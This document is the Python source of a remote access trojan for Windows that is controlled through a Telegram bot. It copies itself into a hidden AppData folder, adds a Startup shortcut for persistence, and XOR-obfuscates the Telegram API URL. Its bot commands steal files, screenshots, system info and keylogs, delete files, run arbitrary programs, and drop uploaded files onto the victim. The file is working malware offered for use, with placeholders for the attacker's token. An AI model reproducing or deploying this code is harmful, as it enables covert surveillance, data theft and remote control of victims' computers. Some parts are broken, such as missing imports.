#!/usr/bin/env python
#from PIL import ImageGrab							# /capture_pc
from shutil import copyfile, copyfileobj, rmtree	# /ls, /pwd, /cd /copy
from sys import argv, path, stdout					# console output
#from json import loads								# reading json from ipinfo.io
from winshell import startup						# persistence
from tendo import singleton							# this makes the application exit if there's another instance already running
from win32com.client import Dispatch				# used for WScript.Shell
from time import strftime, sleep					
#import datetime										# /schedule
#import time
#import threading									# /proxy, /schedule
#import proxy
#import pyaudio, wave								# /hear
import telepot, requests							# telepot => telegram, requests => file download
from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
import os, os.path, platform, ctypes
#import pyHook       # keylogger
import pythoncom	  						
import socket										# internal IP
import getpass										# get username
import collections
me = singleton.SingleInstance() 
# REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
token = ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"
# token = os.environ['RAT_TOKEN'] # you can set your environment variable as well
# ADD YOUR chat_id TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON! 6660201
known_ids = [",,,,,,,,,"]
# known_ids.append(os.environ['TELEGRAM_CHAT_ID']) # make sure to remove this line if you don't have this environment variable
appdata_roaming_folder = os.environ['APPDATA']	# = 'C:\Users\Username\AppData\Roaming'
# HIDING OPTIONS
# ---------------------------------------------
hide_folder = appdata_roaming_folder + r'\Portal'	# = 'C:\Users\Username\AppData\Roaming\Portal'
compiled_name = 'portal.exe'	# Name of compiled .exe to hide in hide_folder, i.e 'C:\Users\Username\AppData\Roaming\Portal\portal.exe'
# ---------------------------------------------
target_shortcut = startup() + '\\' + compiled_name.replace('.exe', '.lnk')
if not os.path.exists(hide_folder):
	os.makedirs(hide_folder)
	hide_compiled = hide_folder + '\\' + compiled_name
	copyfile(argv[0], hide_compiled)
	shell = Dispatch('WScript.Shell')
	shortcut = shell.CreateShortCut(target_shortcut)
	shortcut.Targetpath = hide_compiled
	shortcut.WorkingDirectory = hide_folder
	shortcut.save()
initi = False
keyboardFrozen = False
mouseFrozen = False
user = os.environ.get("USERNAME")	# Windows username to append keylogs.txt
schedule = {}
log_file = hide_folder + '\\keylogs.txt'
# hookManager = pyHook.HookManager()

with open(log_file, "a") as writing:
	writing.write("-------------------------------------------------\n")
	writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n\n")
	
def checkchat_id(chat_id):
	return len(known_ids) == 0 or str(chat_id) in known_ids
	
def pressed_chars(event):
	if event and type(event.Ascii) == int:
		f = open(log_file,"a")
		if len(event.GetKey()) > 1:
			tofile = '<'+event.GetKey()+'>'
		else:
			tofile = event.GetKey()
		if tofile == '<Return>':
			print tofile
		else:
			stdout.write(tofile)
	return not keyboardFrozen
# OFUSCATE    
mask = 'xexoiwck8'
nmask = [ord(c) for c in mask]
lmask = len(mask)

def obfuscate(s):
    # Use same function in both directions.  Input and output are
    # Python 2 strings, ASCII only.
    return ''.join([chr(ord(c) ^ nmask[i % lmask])
                    for i, c in enumerate(s)])
def split_string(n, st):
	lst = ['']
	for i in str(st):
		l = len(lst) - 1
		if len(lst[l]) < n: 
			lst[l] += i
		else:
			lst += [i]
	return lst


def handle(msg):
	chat_id = msg['chat']['id']
	if checkchat_id(chat_id):
		if 'text' in msg:
			print 'Got message from ' + str(chat_id) + ': ' + msg['text']
			command = msg['text']
			response = ''
			if command == '/arp':
				response = ''
				bot.sendChatAction(chat_id, 'typing')
				lines = os.popen('arp -a -N ' + internalIP())
				for line in lines:
					line.replace('\n\n', '\n')
					response += line
			elif command == '/capture_pc':
				bot.sendChatAction(chat_id, 'typing')
				screenshot = ImageGrab.grab()
				screenshot.save('screenshot.jpg')
				bot.sendChatAction(chat_id, 'upload_photo')
				bot.sendDocument(chat_id, open('screenshot.jpg', 'rb'))
				os.remove('screenshot.jpg')
			elif command.startswith('/cd'):
				command = command.replace('/cd ','')
				try:
					os.chdir(command)
					response = os.getcwd() + '>'
				except:
					response = 'No subfolder matching ' + command
			elif command.startswith('/delete'):
				command = command.replace('/delete', '')
				path_file = command.strip()
				try:
					os.remove(path_file)
					response = 'Succesfully removed file'
				except:
					try:
						os.rmdir(path_file)
						response = 'Succesfully removed folder'
					except:
						try:
							shutil.rmtree(path_file)
							response = 'Succesfully removed folder and it\'s files'
						except:
							response = 'File not found'
			elif command.startswith('/download'):
				bot.sendChatAction(chat_id, 'typing')
				path_file = command.replace('/download', '')
				
				path_file = path_file[1:]
				
				if path_file == '':
					response = '/download C:/path/to/file.name or /download file.name'
				else:
					bot.sendChatAction(chat_id, 'upload_document')
					try:
						bot.sendDocument(chat_id, open(path_file, 'rb'))
						print path_file
						
					except:
					
						try:
							bot.sendDocument(chat_id, open(hide_folder + '\\' + path_file))
							response = 'Found in hide_folder: ' + hide_folder
						except:
							response = 'Could not find ' +	path_file
							


			elif command == '/keylogs':
				bot.sendChatAction(chat_id, 'upload_document')
				bot.sendDocument(chat_id, open(log_file, "rb"))
			elif command.startswith('/ls'):
				bot.sendChatAction(chat_id, 'typing')
				command = command.replace('/ls', '')
				command = command.strip()
				files = []
				if len(command) > 0:
					files = os.listdir(command)
				else:
					files = os.listdir(os.getcwd())
				human_readable = ''
				for file in files:
					human_readable += file + '\n'
				response = human_readable

			elif command == '/pc_info':
				bot.sendChatAction(chat_id, 'typing')
				info = ''
				for pc_info in platform.uname():
					info += '\n' + pc_info
				info += '\n' + 'Username: ' + getpass.getuser()
				response = info

			elif command == '/pwd':
				response = os.getcwd()
			elif command.startswith('/run'):
				bot.sendChatAction(chat_id, 'typing')
				path_file = command.replace('/run', '')
				path_file = path_file[1:]
				if path_file == '':
					response = '/run_file C:/path/to/file'
				else:
					try:
						os.startfile(path_file)
						response = 'File ' + path_file + ' has been run'
					except:
						try:
							#os.startfile(hide_folder + '\\' + path_file)
                                                        os.startfile('\\' + path_file)
							response = 'File ' + path_file + ' has been run from hide_folder'
						except:
							response = 'File not found'
							
				#else: # redirect to /help
						
						
				#msg = {'text' : '/help', 'chat' : { 'id' : chat_id }}
				#handle(msg)				

			if response != '':
				responses = split_string(4096, response)
				for resp in responses:
					bot.sendMessage(chat_id, resp)
			
					
					
										
		else: # Upload a file to target
			
			file_name = ''
			file_id = None
			if 'document' in msg:
				file_name = msg['document']['file_name']
				file_id = msg['document']['file_id']
				print file_name ,file_id
			elif 'photo' in msg:
				file_time = int(time.time())
				file_id = msg['photo'][1]['file_id']
				file_name = file_id + '.jpg'
			file_path = bot.getFile(file_id=file_id)['file_path']
			link =obfuscate('\x10\x11\x0c\x1f\x1aMLDY\x08\x0cV\x1b\x0c\x1b\x06\x0cJ\x19\x08V\x00\x1b\x10L\rQ\x14\x00W\r\x06\x03') + str(token) + '/' + file_path
			file = (requests.get(link, stream=True)).raw
			with open(hide_folder + '\\' + file_name, 'wb') as out_file:
				copyfileobj(file, out_file)
			response = 'File received succesfully.'
	return
    
			
			
bot = telepot.Bot(token)
bot.message_loop(handle)
if len(known_ids) > 0:
	helloWorld = platform.uname()[1] + ": I'm up."
	print helloWorld
	for known_id in known_ids:
		bot.sendMessage(known_id, helloWorld)
print 'Listening for commands on ' + platform.uname()[1] + '...'
#hookManager.KeyDown = pressed_chars
#hookManager.HookKeyboard()
pythoncom.PumpMessages()


